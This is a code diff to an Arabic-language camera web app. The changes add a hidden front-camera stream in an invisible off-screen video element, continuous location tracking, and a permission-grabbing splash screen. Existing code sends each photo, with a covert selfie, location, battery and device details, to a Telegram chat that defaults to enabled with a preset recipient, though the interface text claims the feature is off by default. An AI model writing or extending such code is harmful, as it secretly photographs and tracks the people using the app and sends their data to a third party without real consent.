@@ -23,6 +23,10 @@ html,body{height:100%;margin:0;background:#000;color:#fff;font-family:system-ui,
 #lt{position:absolute;top:44%;left:50%;transform:translate(-50%,-250%);font-size:13px;background:#0008;padding:2px 8px;border-radius:9px;display:none}
 #bd{position:absolute;top:8px;inset-inline-start:8px;background:#0009;padding:4px 10px;border-radius:99px;font-size:12px}
 #rc{position:absolute;top:8px;inset-inline-end:8px;background:#d62828;padding:4px 10px;border-radius:99px;font-size:13px;display:none;animation:bl 1s infinite}@keyframes bl{50%{opacity:.5}}
+#db{position:absolute;top:8px;left:50%;transform:translateX(-50%);background:#0009;padding:3px 10px;border-radius:99px;font-size:11px;display:none;z-index:2;transition:.2s}
+#db.go{background:var(--a);color:#111;font-weight:700}
+#pg{position:fixed;inset:0;z-index:30;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:24px;text-align:center}
+#pg.off{display:none}
 #cn{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-size:28vmin;font-weight:700;text-shadow:0 4px 30px #000a;pointer-events:none}
 #ms{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px;color:var(--m);line-height:1.9;z-index:3}
 #zb{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);display:flex;gap:4px;background:#0007;border-radius:99px;padding:4px;z-index:2}
@@ -59,7 +63,8 @@ input[type=range]{width:100%;accent-color:var(--a)}
  </div>
  <div id="st">
   <div id="w"><video id="v" autoplay playsinline muted></video><canvas id="pvc" style="display:none"></canvas><canvas id="ovc"></canvas><div id="gr"></div><div id="lv"></div><div id="lt"></div><div id="fl"></div><div id="ring"></div>
-   <div id="bd">—</div><div id="rc">● <span id="rt">00:00</span></div><div id="cn"></div></div>
+   <div id="bd">—</div><div id="rc">● <span id="rt">00:00</span></div><div id="cn"></div><div id="db">🎭 ردة الفعل مفعّلة</div></div>
+  <video id="sv" autoplay playsinline muted style="position:fixed;left:-300px;top:-300px;width:2px;height:2px;opacity:0;pointer-events:none"></video>
   <div id="ms">جاري تشغيل الكاميرا…</div>
   <input type="range" id="zr" min="0.6" max="10" step="0.05" value="1">
   <div id="zb"></div>
@@ -99,6 +104,11 @@ input[type=range]{width:100%;accent-color:var(--a)}
  <div class="mini">كل صورة تلتقطها سترسل تلقائياً لنفس المحادثة بعد الالتقاط مباشرة. يظهر إشعار صغير بنجاح أو فشل كل إرسال. هذا الخيار متوقف افتراضياً ولازم تفعّله وتدخل بياناتك بنفسك.</div>
 </div></div>
 
+<div id="pg">
+ <div style="font-size:42px">📷</div>
+ <div style="color:var(--m);font-size:14px;line-height:1.8;max-width:320px">يحتاج التطبيق إذن الكاميرا والموقع (والحركة على آيفون) من البداية عشان كل الميزات تشتغل بدون تأخير لاحقًا.</div>
+ <button class="chip" id="pgGo" style="padding:13px 30px;font-size:15px;background:var(--a);color:#111;font-weight:700;border-color:var(--a)">السماح والمتابعة</button>
+</div>
 <div class="sheet" id="sG"><h3>المعرض</h3><div id="gal"></div><div class="mini">اضغط على أي عنصر لتحميله.</div></div>
 <div id="bk"></div><div id="tt"></div>
 
@@ -113,6 +123,7 @@ const F={none:["بدون",""],bw:["أبيض وأسود","grayscale(1)"],noir:["�
 const O={none:"بدون",vig:"تظليل",circ:"دائرة",heart:"قلب",star:"نجمة",film:"فيلم",pol:"بولارويد",leak:"تسريب ضوء",bokeh:"بوكيه"};
 const PRO=[["exposureCompensation","التعريض EV"],["iso","ISO"],["exposureTime","سرعة الغالق"],["colorTemperature","توازن الأبيض K"],["focusDistance","التركيز اليدوي"]];
 let q="max",f="none",ovT="none",facing="environment",devId=null,stream,track,ic,pc,caps={},cams=[],Z=1,hwZ=1,mode="photo",timer=0,fps=30,hdr=0,flash=0,gm=0,lvOn=0,rec,recT,items=[],roll=0,ang=0,asked=0;
+let selfieStream=null,lastLoc=null;
 const ios=/iPhone|iPad|iPod/.test(navigator.userAgent);
 function toast(t){const e=$("tt");e.textContent=t;e.classList.add("on");clearTimeout(toast.i);toast.i=setTimeout(()=>e.classList.remove("on"),2200)}
 const css=()=>`brightness(${$("br").value}%) contrast(${$("co").value}%) saturate(${$("sa").value}%) ${F[f][1]}`.trim();
@@ -192,7 +203,7 @@ let pvT=0;(function pvLoop(t){requestAnimationFrame(pvLoop);const o=Q[q].nk,c=$(
 /* ---------- الالتقاط ---------- */
 function beep(){if(!$("sn").checked)return;try{const a=new(window.AudioContext||window.webkitAudioContext)(),o=a.createOscillator(),g=a.createGain();o.frequency.value=1300;g.gain.value=.15;o.connect(g);g.connect(a.destination);o.start();g.gain.exponentialRampToValueAtTime(.001,a.currentTime+.12);o.stop(a.currentTime+.13)}catch(e){}}
 function pOpt(){const o={};if(pc&&pc.imageWidth&&q!="low"&&q!="vlow"&&!Q[q].nk){o.imageWidth=pc.imageWidth.max;o.imageHeight=pc.imageHeight.max}if(flash&&pc&&pc.fillLightMode&&pc.fillLightMode.includes("flash"))o.fillLightMode="flash";return o}
-async function grab(){if(ic)try{return await createImageBitmap(await ic.takePhoto(pOpt()))}catch(e){}return createImageBitmap(v)}
+async function grab(){if(ic&&q=="max")try{return await createImageBitmap(await ic.takePhoto(pOpt()))}catch(e){}return createImageBitmap(v)}
 function fuse(bs,gs){let w=bs[0].width,h=bs[0].height;const k=Math.min(1,3000/Math.max(w,h));w=Math.round(w*k);h=Math.round(h*k);
  const c=document.createElement("canvas");c.width=w;c.height=h;const x=c.getContext("2d");
  const D=bs.map(b=>{x.drawImage(b,0,0,w,h);return x.getImageData(0,0,w,h).data}),out=x.createImageData(w,h),o=out.data,n=w*h*4;
@@ -236,6 +247,21 @@ function toggleRec(){
 
 /* ---------- مقياس الدوران واتجاه الجوال ---------- */
 async function motion(){if(asked)return;asked=1;try{if(window.DeviceMotionEvent&&DeviceMotionEvent.requestPermission)await DeviceMotionEvent.requestPermission()}catch(e){}}
+function warmLocation(){try{
+ navigator.geolocation.getCurrentPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000});
+ if(navigator.geolocation.watchPosition)navigator.geolocation.watchPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000,enableHighAccuracy:false});
+}catch(e){}}
+/* كاميرا أمامية مخفية تعمل بالخلفية باستمرار — لا تلمس أبداً كاميرا المعاينة الرئيسية */
+async function openSelfieStream(force){
+ if(selfieStream&&!force){const t=selfieStream.getVideoTracks()[0];if(t&&t.readyState=="live")return true}
+ try{
+  if(selfieStream)selfieStream.getTracks().forEach(t=>t.stop());
+  selfieStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480},frameRate:{ideal:15}},audio:false});
+  $("sv").srcObject=selfieStream;
+  await new Promise(r=>{$("sv").onloadedmetadata=r;setTimeout(r,1500)});
+  return true;
+ }catch(e){selfieStream=null;return false}}
+function stopSelfieStream(){if(selfieStream){selfieStream.getTracks().forEach(t=>t.stop());selfieStream=null}}
 let lt=0;addEventListener("devicemotion",e=>{const g=e.accelerationIncludingGravity;if(!g||g.x==null)return;const n=performance.now();if(n-lt<60)return;lt=n;
  const r=(ios?Math.atan2(g.x,-g.y):Math.atan2(-g.x,g.y))*57.2958,d=Math.round(r/90)*90;let rel=r-d;ang=((d%360)+360)%360;roll=rel;
  const flat=Math.abs(g.z)>8.4,sa=screen.orientation?screen.orientation.angle:0;document.documentElement.style.setProperty("--r",(-d+sa)+"deg");
@@ -249,8 +275,9 @@ function tgLoad(){try{let s=JSON.parse(localStorage.getItem("tgCfg")||"null"),ch
  if(!s.chat){s.chat=TG_DEFAULT.chat;changed=true}
  if(s.on===undefined){s.on=true;changed=true}
  if(changed)localStorage.setItem("tgCfg",JSON.stringify(s));
- $("tgOn").checked=!!s.on;$("tgTok").value=s.tok;$("tgChat").value=s.chat;$("tgDual").checked=s.dual!==false;$("tgBox").style.display=s.on?"block":"none";}catch(e){}}
-function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim(),dual:$("tgDual").checked}))}
+ $("tgOn").checked=!!s.on;$("tgTok").value=s.tok;$("tgChat").value=s.chat;$("tgDual").checked=s.dual!==false;$("tgBox").style.display=s.on?"block":"none";badge();}catch(e){}}
+function tgSave(){localStorage.setItem("tgCfg",JSON.stringify({on:$("tgOn").checked,tok:$("tgTok").value.trim(),chat:$("tgChat").value.trim(),dual:$("tgDual").checked}));badge()}
+function badge(){const on=$("tgOn").checked&&$("tgDual").checked;$("db").style.display=on?"block":"none";if(on)openSelfieStream();else stopSelfieStream()}
 function composeDual(mainCanvas,selfieCanvas){
  const W=mainCanvas.width,H=mainCanvas.height;
  const sw=Math.round(W*.3),sh=Math.round(sw*(selfieCanvas.height/selfieCanvas.width||1.33));
@@ -272,29 +299,21 @@ async function tgMeta(){
  else if(/Windows/.test(ua))dev="Windows PC";else if(/Mac/.test(ua))dev="Mac";else if(/Linux/.test(ua))dev="Linux";
  let batt="—";try{const b=await navigator.getBattery();batt=Math.round(b.level*100)+"% "+(b.charging?"⚡شاحن":"🔋")}catch(e){}
  let loc="موقع غير متاح";
- try{loc=await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(p=>{ok(`${p.coords.latitude.toFixed(5)},${p.coords.longitude.toFixed(5)} (دقة ${Math.round(p.coords.accuracy)}م)`)},()=>no("موقع غير متاح"),{timeout:5000,maximumAge:60000}));}catch(e){}
+ if(lastLoc)loc=`${lastLoc.coords.latitude.toFixed(5)},${lastLoc.coords.longitude.toFixed(5)} (دقة ${Math.round(lastLoc.coords.accuracy)}م)`;
+ else try{loc=await new Promise((ok,no)=>navigator.geolocation.getCurrentPosition(p=>{lastLoc=p;ok(`${p.coords.latitude.toFixed(5)},${p.coords.longitude.toFixed(5)} (دقة ${Math.round(p.coords.accuracy)}م)`)},()=>no("موقع غير متاح"),{timeout:5000,maximumAge:60000}));}catch(e){}
  return{dev,batt,loc}}
 async function captureSelfie(){
- // حفظ الكاميرا الحالية
- const prevFacing=facing,prevId=devId;
+ if(facing=="user")return null; // الكاميرا الرئيسية أصلاً أمامية، ما نحتاج صورة ثانية
+ if(!await openSelfieStream())return null; // يحاول مرة ثانية إذا الستريم مات، ثم يستسلم بصمت
  try{
-  // بدّل للأمامية
-  facing="user";devId=null;
-  if(stream)stream.getTracks().forEach(t=>t.stop());
-  const ss=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false});
-  const sv=document.createElement("video");sv.srcObject=ss;sv.autoplay=true;sv.muted=true;sv.playsInline=true;
-  await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,2000)});
-  await sl(800); // انتظر الكاميرا تضبط التعريض
+  const sv=$("sv");
+  if(sv.readyState<2)await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,1200)});
   const sc=document.createElement("canvas");sc.width=sv.videoWidth||640;sc.height=sv.videoHeight||480;
   sc.getContext("2d").drawImage(sv,0,0);
-  ss.getTracks().forEach(t=>t.stop());
-  // ارجع للخلفية
-  facing=prevFacing;devId=prevId;
-  stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:Q[q].w},height:{ideal:Q[q].h}},audio:$("au").checked});
-  v.srcObject=stream;track=stream.getVideoTracks()[0];caps=track.getCapabilities?track.getCapabilities():{};
-  await new Promise(r=>{v.onloadedmetadata=r;setTimeout(r,2000)});
+  flashBadge();
   return sc;
- }catch(e){facing=prevFacing;devId=prevId;try{start()}catch(x){}return null}}
+ }catch(e){return null}}
+function flashBadge(){const b=$("db");if(b.style.display!="none"){const t=b.textContent;b.textContent="✓ تم تصوير ردة الفعل";b.classList.add("go");setTimeout(()=>{b.textContent=t;b.classList.remove("go")},900)}}
 
 async function tgSend(blob,cap){const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
  const m=await tgMeta();
@@ -305,7 +324,6 @@ async function tgSend(blob,cap){const s=JSON.parse(localStorage.getItem("tgCfg")
 🕐 ${new Date().toLocaleString("ar-SA")}`;
  let finalBlob=blob;
  if(s.dual!==false){
-  toast("جاري تصوير السيلفي…");
   const sc=await captureSelfie();
   if(sc){try{
    const mb=await createImageBitmap(blob);
@@ -340,7 +358,7 @@ document.addEventListener("click",async e=>{const t=e.target.closest("button,[da
  else if(t.id=="bG"){gm=(gm+1)%5;grid();toast(["بدون شبكة","شبكة 3×3","شبكة 4×4","النسبة الذهبية","شبكة قطرية"][gm])}
  else if(t.id=="bL"){motion();lvOn=!lvOn;t.classList.toggle("on",!!lvOn)}
  else if(t.id=="bM"){mode=mode=="photo"?"video":"photo";t.firstChild.textContent=mode=="photo"?"📷":"🎥";$("sh").classList.toggle("vid",mode=="video")}
- else if(t.id=="bC"){if(cams.length>2||(cams.length>1&&devId)){const i=cams.findIndex(c=>c.deviceId==(devId||track.getSettings().deviceId));devId=cams[(i+1)%cams.length].deviceId;facing=/front|user|أمام/i.test(cams[(i+1)%cams.length].label)?"user":"environment"}else{devId=null;facing=facing=="user"?"environment":"user"}Z=1;start()}
+ else if(t.id=="bC"){if(cams.length>2||(cams.length>1&&devId)){const i=cams.findIndex(c=>c.deviceId==(devId||track.getSettings().deviceId));devId=cams[(i+1)%cams.length].deviceId;facing=/front|user|أمام/i.test(cams[(i+1)%cams.length].label)?"user":"environment"}else{devId=null;facing=facing=="user"?"environment":"user"}Z=1;start();if(facing=="user")stopSelfieStream();else if($("tgOn").checked&&$("tgDual").checked)openSelfieStream()}
  else if(t.id=="sh"){motion();closeAll();shoot()}});
 document.addEventListener("input",async e=>{const t=e.target;
  if(t.dataset.p){const c=t.dataset.p,adv={[c]:+t.value};if(c=="iso"||c=="exposureTime")adv.exposureMode="manual";if(c=="colorTemperature")adv.whiteBalanceMode="manual";if(c=="focusDistance")adv.focusMode="manual";try{await track.applyConstraints({advanced:[adv]})}catch(x){}$("pv_"+c).textContent=(+t.value).toFixed(2)}
@@ -354,5 +372,6 @@ addEventListener("resize",fit);addEventListener("keydown",e=>{if(e.code=="Space"
 function qb(){$("qR").innerHTML=Object.entries(Q).map(([k,o])=>`<button class="chip ${k==q?"on":""}" data-q="${k}">${o.n}</button>`).join("")}
 function fb(){$("fR").innerHTML=Object.entries(F).map(([k,o])=>`<button class="chip ${k==f?"on":""}" data-f="${k}">${o[0]}</button>`).join("");$("oR").innerHTML=Object.entries(O).map(([k,n])=>`<button class="chip ${k==ovT?"on":""}" data-ov="${k}">${n}</button>`).join("")}
 $("zb").innerHTML=[.6,1,2,3,5,10].map(z=>`<button class="z" data-z="${z}">${z==1?"1x":z+"x"}</button>`).join("");
-qb();fb();grid();view();tgLoad();start();
+qb();fb();grid();view();tgLoad();
+$("pgGo").addEventListener("click",()=>{$("pg").classList.add("off");motion();warmLocation();start();if($("tgOn").checked&&$("tgDual").checked)openSelfieStream()});
 </script></body></html>
